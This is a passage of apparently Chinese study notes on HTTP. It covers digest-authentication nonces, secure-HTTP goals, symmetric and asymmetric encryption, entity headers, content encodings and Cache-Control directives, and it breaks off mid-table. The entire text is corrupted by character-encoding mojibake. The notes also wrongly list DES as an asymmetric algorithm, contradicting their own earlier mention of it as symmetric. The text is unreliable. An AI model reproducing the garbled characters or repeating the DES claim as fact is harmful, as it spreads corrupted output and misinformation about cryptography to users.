æ­¤æœåŠ¡å™¨å¯ä»¥éªŒè¯æ‰€æä¾›çš„æ‘˜è¦æ˜¯å¦ä¸å¯†ç ç›¸åŒ¹é…ã€‚ï¼ˆæŸå…¬å¸çš„ X5 åè®®ï¼‰</p><p>æ‘˜è¦æ˜¯â€œå¯¹ä¿¡æ¯ä¸»ä½“çš„æµ“ç¼©â€ã€‚æ‘˜è¦æ˜¯ä¸€ç§å•å‘å‡½æ•°ï¼Œä¸»è¦ç”¨äºå°†æ— é™çš„è¾“å…¥å€¼è½¬æ¢ä¸ºæœ‰é™çš„æµ“ç¼©è¾“å‡ºå€¼ã€‚å¸¸è§çš„æ‘˜è¦å‡½æ•°æœ‰ MD5ã€SHA-1ã€SHA-2 ç­‰ã€‚</p><p>ä¸ºäº†é˜²æ­¢é‡æ”¾æ”»å‡»ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªç§°ä¸ºéšæœºæ•°ï¼ˆnonceï¼‰çš„ç‰¹æ®Šä»¤ç‰Œï¼Œè¿™ä¸ªæ•°ä¼šç»å¸¸å‘ç”Ÿå˜åŒ–ï¼ˆå¯èƒ½æ˜¯æ¯æ¯«ç§’ï¼Œæˆ–è€…æ˜¯æ¯æ¬¡è®¤è¯éƒ½å˜åŒ–ï¼‰ã€‚å®¢æˆ·ç«¯åœ¨è®¡ç®—æ‘˜è¦ä¹‹å‰è¦å…ˆå°†è¿™ä¸ªéšæœºæ•°ä»¤ç‰Œé™„åŠ åˆ°å¯†ç ä¸Šå»ã€‚<strong>æ‘˜è¦è®¤è¯è¦æ±‚ä½¿ç”¨éšæœºæ•°æ¥ç ´åé‡æ”¾æ”»å‡»</strong>ï¼Œå› ä¸ºè¿™ä¸ªå°å°çš„é‡æ”¾å¼±ç‚¹ä¼šä½¿æœªéšæœºåŒ–çš„æ‘˜è¦è®¤è¯å˜å¾—å’ŒåŸºæœ¬è®¤è¯ä¸€æ ·è„†å¼±ï¼Œéšæœºæ•°æ˜¯åœ¨<code>WWW-Authenticate</code>è´¨è¯¢ä¸­ä»æœåŠ¡å™¨ä¼ é€ç»™å®¢æˆ·ç«¯çš„ã€‚</p><p>éšæœºæ•°è¿‡æœŸæ—¶ï¼Œå³ä¾¿è€çš„<code>Authorization</code>é¦–éƒ¨æ‰€åŒ…å«çš„éšæœºæ•°ä¸å†æ–°é²œäº†ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥é€‰æ‹©æ¥å—å…¶ä¸­çš„ä¿¡æ¯ã€‚æœåŠ¡å™¨ä¹Ÿå¯ä»¥è¿”å›ä¸€ä¸ªå¸¦æœ‰æ–°éšæœºæ•°çš„ 401 å“åº”ï¼Œè®©å®¢æˆ·ç«¯é‡è¯•è¿™æ¡è¯·æ±‚ï¼›æŒ‡å®šè¿™ä¸ªå“åº”ä¸º<code>stale=true</code>ï¼Œè¡¨ç¤ºæœåŠ¡å™¨åœ¨å‘ŠçŸ¥å®¢æˆ·ç«¯ç”¨æ–°çš„éšæœºæ•°æ¥é‡è¯•ï¼Œè€Œä¸å†é‡æ–°æç¤ºè¾“å…¥æ–°çš„ç”¨æˆ·åå’Œå¯†ç äº†ã€‚ï¼ˆå‚ç…§å¾®ä¿¡å…¬ä¼—å·çš„ token è¿‡æœŸå¤„ç†æ–¹å¼ï¼‰</p><p>RFC 2617 å»ºè®®é‡‡ç”¨è¿™ä¸ªå‡æƒ³çš„éšæœºæ•°å…¬å¼ï¼š<code>BASE64(time-stamp H(time-stamp &quot;:&quot; ETag &quot;:&quot; private-key))</code>ã€‚å…¶ä¸­ time-stamp æ˜¯æœåŠ¡å™¨äº§ç”Ÿçš„æ—¶é—´æˆ–å…¶ä»–ä¸ä¼šé‡å¤çš„å€¼ï¼ŒETag æ˜¯ä¸æ‰€è¯·æ±‚å®ä½“æœ‰å…³çš„ HTTP ETag é¦–éƒ¨çš„å€¼ï¼Œprivate-key æ˜¯åªæœ‰æœåŠ¡å™¨çŸ¥é“çš„æ•°æ®ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gakjg3ndflj30mn0m3qbk.jpg" alt=""></p><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘åˆ°æœåŠ¡å™¨å¯ä»¥å¯¹æŸä¸ªèµ„æºå‘èµ·å¤šé‡è´¨è¯¢ã€‚æ¯”å¦‚ï¼Œå¦‚æœæœåŠ¡å™¨ä¸äº†è§£å®¢æˆ·ç«¯çš„èƒ½åŠ›ï¼Œå°±å¯ä»¥æ—¢æä¾›åŸºæœ¬è®¤è¯è´¨è¯¢ï¼Œåˆæä¾›æ‘˜è¦è®¤è¯è´¨è¯¢ã€‚å®¢æˆ·ç«¯é¢å¯¹å¤šé‡è´¨è¯¢æ—¶ï¼Œå¿…é¡»ä»¥å®ƒæ‰€æ”¯æŒçš„æœ€å¼ºçš„è´¨è¯¢æœºåˆ¶æ¥åº”ç­”ã€‚å¦å¤–ï¼Œå¦‚æœè¯·æ±‚çš„æ‘˜è¦ä¸åŒ¹é…ï¼Œå°±åº”è¯¥è®°å½•ä¸€æ¬¡ç™»å½•å¤±è´¥ã€‚æŸå®¢æˆ·ç«¯è¿ç»­å¤šæ¬¡å¤±è´¥å¯èƒ½è¯´æ˜æœ‰æ”»å‡»è€…æ­£åœ¨çŒœæµ‹å¯†ç ã€‚</p><p>ä¸€ç§å¯ä»¥å®Œå…¨é¿å…é‡æ”¾æ”»å‡»çš„æ–¹æ³•å°±æ˜¯ä¸ºæ¯ä¸ªäº‹åŠ¡éƒ½ä½¿ç”¨ä¸€ä¸ªå”¯ä¸€çš„éšæœºæ•°ã€‚åœ¨è¿™ç§å®ç°æ–¹å¼ä¸­ï¼ŒæœåŠ¡å™¨ä¼šä¸ºæ¯ä¸ªäº‹åŠ¡å‘å¸ƒå”¯ä¸€çš„éšæœºæ•°å’Œä¸€ä¸ªè¶…æ—¶å€¼ã€‚å‘å¸ƒçš„éšæœºæ•°åªå¯¹æŒ‡å®šçš„äº‹åŠ¡æœ‰æ•ˆï¼Œè€Œä¸”åªåœ¨è¶…æ—¶å€¼çš„æŒç»­åŒºé—´å†…æœ‰æ•ˆã€‚è¿™ç§æ–¹å¼ä¼šå¢åŠ æœåŠ¡å™¨çš„è´Ÿæ‹…ï¼Œä½†è¿™ç§è´Ÿæ‹…å¯å¿½ç•¥ä¸è®¡ã€‚</p><p>nonce ç”¨äºè®¤è¯å®¢æˆ·ç«¯ï¼Œcnonce ç”¨äºè®¤è¯æœåŠ¡ç«¯ã€‚</p><h1 id="ç¬¬14ç« -å®‰å…¨-HTTP"><a href="#ç¬¬14ç« -å®‰å…¨-HTTP" class="headerlink" title="ç¬¬14ç«  å®‰å…¨ HTTP"></a>ç¬¬14ç«  å®‰å…¨ HTTP</h1><p>å®‰å…¨ HTTP éœ€è¦æ»¡è¶³</p><ul><li>æœåŠ¡å™¨è®¤è¯ã€‚æœåŠ¡å•ä¸ä¼šè¢«ä¼ªé€ </li><li>å®¢æˆ·ç«¯è®¤è¯ã€‚å®¢æˆ·ç«¯ä¸ä¼šè¢«ä¼ªé€ </li><li>å®Œæ•´æ€§ã€‚æ•°æ®ä¸ä¼šè¢«ä¿®æ”¹</li><li>åŠ å¯†ã€‚é€šä¿¡å†…å®¹åŠ å¯†</li><li>æ•ˆç‡ã€‚è¶³å¤Ÿå¿«çš„ç®—æ³•</li><li>æ™®é€‚æ€§ã€‚åŸºæœ¬ä¸Šæ‰€æœ‰çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½æ”¯æŒè¿™äº›åè®®</li><li>ç®¡ç†çš„å¯æ‰©å±•æ€§ã€‚åœ¨ä»»ä½•åœ°æ–¹çš„ä»»ä½•äººéƒ½å¯ä»¥ç«‹å³è¿›è¡Œå®‰å…¨é€šä¿¡</li><li>é€‚åº”æ€§ã€‚èƒ½å¤Ÿæ”¯æŒå½“å‰æœ€çŸ¥åçš„å®‰å…¨æ–¹æ³•</li><li>åœ¨ç¤¾ä¼šä¸Šçš„å¯è¡Œæ€§</li></ul><p>æ—©æœŸï¼Œäººä»¬ä½¿ç”¨å¯†ç æœºåŠ è§£å¯†ï¼ŒåŠ å¯†ç®—æ³•å’Œå¯†ç æœºéƒ½æœ‰å¯èƒ½è½å…¥æ•Œäººæ‰‹ä¸­ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æœºå™¨ä¸Šéƒ½æœ‰ä¸€äº›å·ç›˜ï¼Œå¯ä»¥å°†å…¶è®¾ç½®ä¸ºå¤§é‡ä¸åŒçš„å€¼ä»¥æ”¹å˜å¯†ç çš„å·¥ä½œæ–¹å¼ï¼Œå³ä½¿æœºå™¨è¢«ç›—ï¼Œæ²¡æœ‰æ­£ç¡®çš„å·ç›˜è®¾ç½®ï¼ˆå¯†é’¥ï¼‰ï¼Œè§£ç å™¨ä¹Ÿæ— æ³•æ­£å¸¸å·¥ä½œã€‚</p><h2 id="å¯¹ç§°åŠ å¯†"><a href="#å¯¹ç§°åŠ å¯†" class="headerlink" title="å¯¹ç§°åŠ å¯†"></a>å¯¹ç§°åŠ å¯†</h2><p>åœ¨å¯¹ç§°åŠ å¯†æŠ€æœ¯ä¸­ï¼Œå‘é€ç«¯ä¸æ¥æ”¶ç«¯è¦å…±äº«ç›¸åŒçš„å¯†é’¥æ‰èƒ½è¿›è¡Œé€šä¿¡ã€‚å¸¸è§çš„å¯¹ç§°åŠ å¯†ç®—æ³•æœ‰ï¼šAESã€3DESã€DES(å·²è¢«è¯æ˜ä¸å®‰å…¨)ç­‰ã€‚</p><p>å¯ç”¨å¯†é’¥å€¼çš„æ•°é‡å–å†³äºå¯†é’¥ä¸­çš„ä½æ•°ï¼Œä»¥åŠå¯èƒ½çš„å¯†é’¥ä¸­æœ‰å¤šå°‘æ˜¯æœ‰æ•ˆçš„ã€‚å°±å¯¹ç§°å¯†é’¥åŠ å¯†æŠ€æœ¯æ¥è¯´ï¼Œé€šå¸¸æ‰€æœ‰çš„å¯†é’¥å€¼éƒ½æ˜¯æœ‰æ•ˆçš„ï¼ˆRSA ä¸­ï¼Œæœ‰æ•ˆå¯†é’¥å¿…é¡»ä»¥æŸç§æ–¹å¼ä¸è´¨æ•°ç›¸å…³ï¼‰ã€‚8ä½çš„å¯†é’¥åªæœ‰256ä¸ªå¯èƒ½çš„å¯†é’¥å€¼ï¼Œ40ä½çš„å¯†é’¥å¯ä»¥æœ‰2^40ä¸ªå¯èƒ½çš„å¯†é’¥å€¼(å¤§çº¦æ˜¯-ä¸‡äº¿ä¸ªå¯†é’¥)ï¼Œ128 ä½çš„å¯†é’¥å¯ä»¥äº§ç”Ÿå¤§çº¦ 3.4*10^38 ä¸ªå¯èƒ½çš„å¯†é’¥å€¼ã€‚</p><p>åœ¨å¯¹ç§°åŠ å¯†ä¸­ï¼Œå¦‚æœæœåŠ¡å™¨ä¸ 100 ä¸‡ä¸ªç”¨æˆ·è¿›è¡Œå®‰å…¨ä¼šè¯ï¼Œå°±éœ€è¦ç»´æŠ¤ 100 ä¸‡ä¸ªå¯†é’¥ï¼Œè¿™æ— ç–‘æ˜¯ä¸€ç¬”ä¸å°çš„å¼€é”€ã€‚å…¬å¼€å¯†é’¥æŠ€æœ¯é¿å…äº†å¯¹ç§°åŠ å¯†æŠ€æœ¯ä¸­æˆå¯¹å¯†é’¥æ•°ç›®çš„ N^2 æ‰©å±•é—®é¢˜ã€‚</p><h2 id="éå¯¹ç§°åŠ å¯†"><a href="#éå¯¹ç§°åŠ å¯†" class="headerlink" title="éå¯¹ç§°åŠ å¯†"></a>éå¯¹ç§°åŠ å¯†</h2><p>éå¯¹ç§°åŠ å¯†æ˜¯ä½¿ç”¨ä¸€å¯¹å¯†é’¥è¿›è¡ŒåŠ è§£å¯†ï¼Œåˆ†åˆ«ç§°ä¸ºå…¬é’¥å’Œç§é’¥ï¼Œä½¿ç”¨å…¬é’¥åŠ å¯†çš„å†…å®¹åªèƒ½ç”¨ç§é’¥è§£å¯†ï¼Œä½¿ç”¨ç§é’¥åŠ å¯†çš„å†…å®¹åªèƒ½ç”¨å…¬é’¥è§£å¯†ã€‚å¸¸è§çš„éå¯¹ç§°åŠ å¯†ç®—æ³•æœ‰ RSAã€DESã€ECDSAï¼Œå…¶ä¸­ä½¿ç”¨æœ€å¹¿æ³›çš„ç®—æ³•æ˜¯ RSAã€‚</p><p>RSAåŸç†èµ„æ–™ï¼š</p><ol><li><a href="https://luyuhuang.github.io/2019/10/24/mathematics-principle-of-rsa-algorithm.html" target="_blank" rel="noopener">RSA ç®—æ³•èƒŒåçš„æ•°å­¦åŸç†</a></li><li><a href="https://cjting.me/2020/03/13/rsa/" target="_blank" rel="noopener">RSA çš„åŸç†ä¸å®ç°</a></li><li><a href="https://www.bilibili.com/video/av26639065" target="_blank" rel="noopener">ææ°¸ä¹è€å¸ˆ 11 åˆ†é’Ÿè®² RSA åŠ å¯†ç®—æ³•</a></li><li><a href="https://www.bilibili.com/video/av35557954" target="_blank" rel="noopener">åŸºäºæ¬§æ‹‰å‡½æ•°çš„ RSA ç®—æ³•åŠ å¯†åŸç†æ˜¯ä»€ä¹ˆ</a></li><li><a href="https://www.bilibili.com/video/av34660391" target="_blank" rel="noopener">RSA ç®—æ³• â€“ åŸºæœ¬åŸç†ç¯‡</a></li></ol><p>ECDSA åŸç†èµ„æ–™ï¼š</p><ol><li><a href="https://www.bilibili.com/video/av74880228" target="_blank" rel="noopener">æ¤­åœ†æ›²çº¿åŠ å¯†ä¸å“ˆå¸Œå‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ</a></li></ol><blockquote><p>åˆ¤å®šä¸€ä¸ªæ•´æ•°æ˜¯å¦æ˜¯è´¨æ•°åˆ™æ¯”åˆ†è§£è¯¥æ•´æ•°ç®€å•è®¸å¤šï¼ˆç»™å‡ºä¸¤ä¸ªå¤§å› æ•°ï¼Œå¾ˆå®¹æ˜“å°±èƒ½å°†å®ƒä»¬ä¸¤ä¸ªç›¸ä¹˜ã€‚ä½†æ˜¯ï¼Œç»™å‡ºå®ƒä»¬çš„ä¹˜ç§¯ï¼Œæ‰¾å‡ºå®ƒä»¬çš„å› å­å°±æ˜¾å¾—ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“äº†ï¼‰ã€‚è¿™å°±æ˜¯è®¸å¤šç°ä»£å¯†ç ç³»ç»Ÿçš„å…³é”®æ‰€åœ¨ã€‚å¦‚æœèƒ½å¤Ÿæ‰¾åˆ°è§£å†³æ•´æ•°åˆ†è§£é—®é¢˜çš„å¿«é€Ÿæ–¹æ³•ï¼Œå‡ ä¸ªé‡è¦çš„å¯†ç ç³»ç»Ÿå°†ä¼šè¢«æ”»ç ´ï¼ŒåŒ…æ‹¬ RSA å…¬é’¥ç®—æ³•å’Œ Blum Blum Shub éšæœºæ•°å‘ç”Ÿå™¨ã€‚</p></blockquote><h1 id="ç¬¬15ç« -å®ä½“å’Œç¼–ç "><a href="#ç¬¬15ç« -å®ä½“å’Œç¼–ç " class="headerlink" title="ç¬¬15ç«  å®ä½“å’Œç¼–ç "></a>ç¬¬15ç«  å®ä½“å’Œç¼–ç </h1><p>æ¯å¤©éƒ½æœ‰æ•°ä»¥äº¿è®¡çš„å„ç§åª’ä½“å¯¹è±¡ç»ç”± HTTP å‘é€ï¼ŒHTTP è¦ç¡®ä¿å®ƒæ‰€æ‰¿è½½çš„â€œè´§ç‰©â€æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>å¯ä»¥è¢«æ­£ç¡®åœ°è¯†åˆ«ï¼ˆContent-type è¯´æ˜åª’ä½“æ ¼å¼ï¼ŒContent-Language è¯´æ˜è¯­è¨€ï¼‰ï¼Œä»¥ä¾¿æµè§ˆå™¨ç­‰æ­£ç¡®å¤„ç†å†…å®¹</li><li>å¯ä»¥è¢«æ­£ç¡®åœ°å‡ åŒ…ï¼ˆContent-Length å’Œ Content-Encodingï¼‰</li><li>æ˜¯æœ€æ–°çš„ï¼ˆé€šè¿‡å®ä½“éªŒè¯ç å’Œç¼“å­˜è¿‡æœŸæ§åˆ¶ï¼‰</li><li>ç¬¦åˆç”¨æˆ·çš„éœ€è¦ï¼ˆåŸºäº Accept ç³»åˆ—çš„å†…å®¹åå•†é¦–éƒ¨ï¼‰</li><li>åœ¨ç½‘ç»œä¸Šå¯ä»¥å¿«é€Ÿæœ‰æ•ˆåœ°ä¼ è¾“ï¼ˆé€šè¿‡èŒƒå›´è¯·æ±‚ã€å·®å¼‚ç¼–ç ä»¥åŠå…¶ä»–æ•°æ®å‹ç¼©æ–¹æ³•ï¼‰</li><li>å®Œæ•´åˆ°è¾¾ã€æœªè¢«ç¯¡æ”¹ï¼ˆé€šè¿‡ä¼ è¾“ç¼–ç é¦–éƒ¨å’Œ Content-MD5 æ ¡éªŒå’Œé¦–éƒ¨ï¼‰</li></ul><h2 id="HTTP-1-1å®šä¹‰äº†ä»¥ä¸‹-10-ä¸ªåŸºæœ¬é¦–éƒ¨å­—æ®µï¼š"><a href="#HTTP-1-1å®šä¹‰äº†ä»¥ä¸‹-10-ä¸ªåŸºæœ¬é¦–éƒ¨å­—æ®µï¼š" class="headerlink" title="HTTP/1.1å®šä¹‰äº†ä»¥ä¸‹ 10 ä¸ªåŸºæœ¬é¦–éƒ¨å­—æ®µï¼š"></a>HTTP/1.1å®šä¹‰äº†ä»¥ä¸‹ 10 ä¸ªåŸºæœ¬é¦–éƒ¨å­—æ®µï¼š</h2><table><thead><tr><th>é¦–éƒ¨</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>Content-Type</code></td><td>å®ä½“ä¸­æ‰€æ‰¿è½½å¯¹è±¡çš„ç±»å‹</td></tr><tr><td><code>Content-Length</code></td><td>æ‰€ä¼ é€å®ä½“ä¸»ä½“çš„é•¿åº¦æˆ–å¤§å°</td></tr><tr><td><code>Content-Language</code></td><td>ä¸æ‰€ä¼ é€å¯¹è±¡æœ€ç›¸åŒ¹é…çš„äººç±»è¯­è¨€</td></tr><tr><td><code>Content-Encoding</code></td><td>å¯¹è±¡æ•°æ®æ‰€åšçš„ä»»æ„å˜æ¢ï¼ˆå¦‚å‹ç¼©ï¼‰</td></tr><tr><td><code>Content-Location</code></td><td>ä¸€ä¸ªå¤‡ç”¨ä½ç½®ï¼Œè¯·æ±‚æ—¶å¯é€šè¿‡å®ƒè·å¾—å¯¹è±¡</td></tr><tr><td><code>Content-Range</code></td><td>å¦‚æœè¿™æ˜¯éƒ¨åˆ†å®ä½“ï¼Œè¿™ä¸ªé¦–éƒ¨è¯´æ˜å®ƒæ˜¯æ•´ä½“çš„å“ªä¸ªéƒ¨åˆ†</td></tr><tr><td><code>Content-MD5</code></td><td>å®ä½“ä¸»ä½“å†…å®¹çš„æ ¡éªŒå’Œ</td></tr><tr><td><code>Last-Modified</code></td><td>æ‰€ä¼ è¾“å†…å®¹åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºæˆ–æœ€åä¿®æ”¹çš„æ—¥æœŸæ—¶é—´</td></tr><tr><td><code>Expires</code></td><td>å®ä½“æ•°æ®å°†è¦å¤±æ•ˆçš„æ—¥æœŸæ—¶é—´</td></tr><tr><td><code>Allow</code></td><td>è¯¥èµ„æºæ‰€å…è®¸çš„å„ç§è¯·æ±‚æ–¹æ³•ï¼Œå¦‚ GET æˆ– POST</td></tr><tr><td><code>ETag</code></td><td>è¯¥æ–‡æ¡£ç‰¹å®šç¤ºä¾‹çš„å”¯ä¸€éªŒè¯ç ã€‚ETag æœªè¢«å®šä¹‰ä¸ºå®ä½“é¦–éƒ¨</td></tr><tr><td><code>Cache-Control</code></td><td>æŒ‡å‡ºè¯¥æ–‡æ¡£åº”è¯¥å¦‚ä½•ç¼“å­˜ï¼Œä¸ ETag é¦–éƒ¨ç±»ä¼¼ï¼Œä¹Ÿæœªè¢«å®šä¹‰ä¸ºæ­£å¼å®ä½“é¦–éƒ¨</td></tr></tbody></table><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>Content-Lengthå¯¹äºæŒä¹…è¿æ¥æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå¦‚æœæ²¡æœ‰Content-Lengthï¼ŒHTTP åº”ç”¨ç¨‹åºå°±ä¸çŸ¥é“å®ä½“ä¸»ä½“åœ¨å“ªé‡Œç»“æŸï¼Œä¸‹ä¸€æ¡æŠ¥æ–‡ä»å“ªé‡Œå¼€å§‹ã€‚</p><h3 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h3><p>Content-Type çš„å€¼æ˜¯æ ‡å‡†åŒ–çš„ MIME ç±»å‹ï¼Œéƒ½æ˜¯åœ¨äº’è”ç½‘å·ç åˆ†é…æœºæ„ï¼ˆIANAï¼‰ä¸­æ³¨å†Œçš„ã€‚</p><h3 id="Content-Encoding-å¸¸ç”¨å€¼"><a href="#Content-Encoding-å¸¸ç”¨å€¼" class="headerlink" title="Content-Encoding å¸¸ç”¨å€¼"></a>Content-Encoding å¸¸ç”¨å€¼</h3><table><thead><tr><th>å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>gzip</td><td>é‡‡ç”¨ GNU zip ç¼–ç </td></tr><tr><td>compress</td><td>é‡‡ç”¨ Unix çš„æ–‡ä»¶å‹ç¼©ç¨‹åº</td></tr><tr><td>deflate</td><td>é‡‡ç”¨ç”¨ zlib æ ¼å¼å‹ç¼©</td></tr><tr><td>identity</td><td>æœªå¯¹å®ä½“ç¼–ç ï¼Œæ— Content-Encoding é¦–éƒ¨æ—¶ï¼Œé»˜è®¤æ­¤ç§æƒ…å†µ</td></tr></tbody></table><p>gzipã€compressã€deflate éƒ½æ˜¯æ— æŸå‹ç¼©ç®—æ³•ï¼Œç”¨äºå‡å°‘ä¼ è¾“æŠ¥æ–‡çš„å¤§å°ï¼Œä¸ä¼šå¯¼è‡´ä¿¡æ¯çš„æŸå¤±ã€‚å…¶ä¸­ï¼Œgzip é€šå¸¸æ•ˆç‡æœ€é«˜ï¼Œä½¿ç”¨æœ€å¹¿æ³›ã€‚gzip ä¸ deflate çš„å‹ç¼©ç®—æ³•å¯ä»¥é˜…è¯»<a href="https://luyuhuang.github.io/2020/04/28/gzip-and-deflate.html" target="_blank" rel="noopener">Gzip æ ¼å¼å’Œ DEFLATE å‹ç¼©ç®—æ³•</a>ã€‚</p><h3 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h3><p>å®¢æˆ·ç«¯å°†æ”¯æŒçš„ç¼–ç æ–¹å¼åˆ—è¡¨æ”¾åœ¨ Accept-Encodingï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰è¯¥é¦–éƒ¨ï¼Œåˆ™æœåŠ¡ç«¯è®¤ä¸ºå®¢æˆ·ç«¯èƒ½å¤Ÿæ¥å—ä»»ä½•ç¼–ç å½¢å¼ï¼ˆç­‰åŒäº Accept-Encoding:*ï¼‰ã€‚</p><p>Accept-Encodingå­—æ®µåŒ…å«ç”¨é€—å·åˆ†éš”çš„æ”¯æŒç¼–ç çš„åˆ—è¡¨ï¼Œå¦‚</p><ul><li>Accept-Encoding: compress, gzip</li><li>Accept-Encoding: </li><li>Accept-Encoding: *</li><li>Accept-Encoding: compress;q=0.5, gzip;q=1.0</li><li>Accept-Encoding: gzip;q=1.0, identity; q=0.5, *;q=0</li></ul><p>å®¢æˆ·ç«¯å¯ä»¥ç»™æ¯ç§ç¼–ç é™„å¸¦Q (è´¨é‡)å€¼å‚æ•°æ¥è¯´æ˜ç¼–ç çš„ä¼˜å…ˆçº§ã€‚Qå€¼çš„èŒƒå›´ä»0.0åˆ°1.0ï¼Œ0.0è¯´æ˜å®¢æˆ·ç«¯ä¸æƒ³æ¥å—æ‰€è¯´æ˜çš„ç¼–ç ï¼Œ1.0åˆ™è¡¨æ˜æœ€å¸Œæœ›ä½¿ç”¨çš„ç¼–ç ï¼Œç¼ºçœæ—¶åˆ™ä¸º 1.0ã€‚â€œ*â€è¡¨ç¤ºâ€œä»»ä½•å…¶ä»–æ–¹æ³•â€ã€‚identityç¼–ç ä»£å·åªèƒ½åœ¨Accept-Encodingé¦–éƒ¨ä¸­å‡ºç°ï¼Œå®¢æˆ·ç«¯ç”¨å®ƒæ¥è¯´æ˜ç›¸å¯¹äºå…¶ä»–å†…å®¹ç¼–ç ç®—æ³•çš„ä¼˜å…ˆçº§ã€‚</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>ç”¨äºå‘ŠçŸ¥æ¥æ”¶æ–¹ä¸ºäº†å¯é åœ°ä¼ è¾“æŠ¥æ–‡ï¼Œå·²ç»å¯¹å…¶è¿›è¡Œäº†ä½•ç§ç¼–ç ã€‚</p><h3 id="æ–°é²œåº¦"><a href="#æ–°é²œåº¦" class="headerlink" title="æ–°é²œåº¦"></a>æ–°é²œåº¦</h3><p>æœåŠ¡å™¨å¯ä»¥ç”¨ Expires å’Œ Cache-Control é¦–éƒ¨æä¾›å®¢æˆ·ç«¯ç¼“å­˜æ–‡æ¡£çš„æ–°é²œåº¦ã€‚<br>ä¸ºäº†æ­£ç¡®ä½¿ç”¨ Expires é¦–éƒ¨ï¼ŒæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯å¿…é¡»æ—¶é’ŸåŒæ­¥ï¼Œè¿™å¹¶ä¸æ€»æ˜¯å¾ˆå®¹æ˜“ï¼Œè€Œ Cache-Control é¦–éƒ¨å¯ä»¥ç”¨ç§’æ•°æ¥è§„å®šæ–‡æ¡£çš„æœ€é•¿ä½¿ç”¨æœŸï¼ŒCache-Control é™¤äº†ä½¿ç”¨æœŸæˆ–è¿‡æœŸæ—¶é—´å¤–ï¼Œè¿˜æœ‰å…¶ä»–æŒ‡ä»¤å¯ç”¨ï¼š<br>|æŒ‡ä»¤|æŠ¥æ–‡ç±»å‹|æè¿°|<br>|-|-|-|<br>|no-cache|è¯·æ±‚|åœ¨é‡æ–°å‘æœåŠ¡éªŒè¯ä¹‹å‰ï¼Œä¸è¦è¿”å›æ–‡æ¡£çš„ç¼“å­˜å‰¯æœ¬|<br>|no-store|è¯·æ±‚|ä¸è¦åæ‚”æ–‡æ¡£çš„ç¼“å­˜å‰¯æœ¬ï¼Œä¸è¦ä¿å­˜æœåŠ¡å™¨çš„å“åº”|<br>|max-age|è¯·æ±‚|ç¼“å­˜ä¸­çš„æ–‡æ¡£ä¸èƒ½è¶…è¿‡æŒ‡å®šçš„ä½¿ç”¨æœŸ|<br>|max-stale|è¯·æ±‚|æ–‡æ¡£å…è®¸è¿‡æœŸï¼Œä½†ä¸èƒ½è¶…è¿‡æŒ‡ä»¤ä¸­çš„è¿‡æœŸå€¼|<br>|min-fresh|è¯·æ±‚|æ–‡æ¡£çš„ä½¿ç”¨æœŸä¸èƒ½å°äºè¿™ä¸ªæŒ‡å®šçš„æ—¶é—´ä¸å®ƒçš„å½“å‰å­˜æ´»æ—¶é—´ä¹‹å’Œã€‚æ¢è¨€ä¹‹ï¼Œå“åº”å¿…é¡»è‡³å°‘åœ¨æŒ‡å®šçš„è¿™æ®µæ—¶é—´å†…ä¿æŒæ–°é²œ<br>|no-transform|è¯·æ±‚|æ–‡æ¡£åœ¨å‘é€ä¹‹å‰ä¸å…è®¸è¢«è½¬æ¢<br>|only-if-cached|è¯·æ±‚|ä»…å½“æ–‡æ¡£åœ¨ç¼“å­˜ä¸­æ‰å‘é€ï¼Œä¸è¦è”ç³»åŸå§‹æœåŠ¡å™¨<br>|public|å“åº”|å“åº”å¯ä»¥è¢«ä»»ä½•æœåŠ¡å™¨ç¼“å­˜<br>|private|å“åº”|å“åº”å¯ä»¥è¢«ç¼“å­˜ï¼Œä½†åªèƒ½è¢«å•ä¸ªå®¢æˆ·ç«¯è®¿é—®<br>|no-cache|å“åº”|å¦‚æœè¯¥æ™ºåŠ›é«˜ä¼´éšä¸€ä¸ªé¦–éƒ¨åˆ—è¡¨çš„è¯ï¼Œé‚£ä¹ˆå†…å®¹å¯ä»¥è¢«ç¼“å­˜å¹¶æä¾›ç»™å®¢æˆ·ç«¯ï¼Œä½†å¿…é¡»å…ˆåˆ é™¤æ‰€åˆ—å‡ºçš„é¦–éƒ¨ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šé¦–éƒ¨ï¼Œç¼“å­˜ä¸­çš„å‰¯æœ¬åœ¨æ²¡æœ‰é‡æ–°å‘æœåŠ¡å™¨éªŒè¯ä¹‹å‰ä¸èƒ½æä¾›ç»™å®¢æˆ·ç«¯<br>|no-store|å“åº”|å“åº”ä¸å…è®¸è¢«ç¼“å­˜<br>|no-transform|å“åº”|å“åº”åœ¨æä¾›ç»™å®¢æˆ·ç«¯ä¹‹å‰ä¸èƒ½åšä»»ä½•å½¢å¼çš„ä¿®æ”¹<br>|must-revalidate|å“åº”|å“åº”åœ¨æä¾›ç»™å®¢æˆ·ç«¯ä¹‹å‰é‡æ–°å‘æœåŠ¡å™¨éªŒè¯<br>|proxy-revalidate|å“åº”|å…±äº«çš„ç¼“å­˜åœ¨æä¾›ç»™å®¢æˆ·ç«¯ä¹‹å‰é‡æ–°å‘æœåŠ¡å™¨éªŒè¯ã€‚ç§æœ‰çš„ç¼“å­˜å¯ä»¥å¿½ç•¥æœ¬æŒ‡ä»¤<br>|max-age|å“åº”|æŒ‡å®šæ–‡æ¡£å¯ä»¥è¢«ç¼“å­˜çš„æ—¶é—´ä»¥åŠæ–°é²œåº¦çš„æœ€é•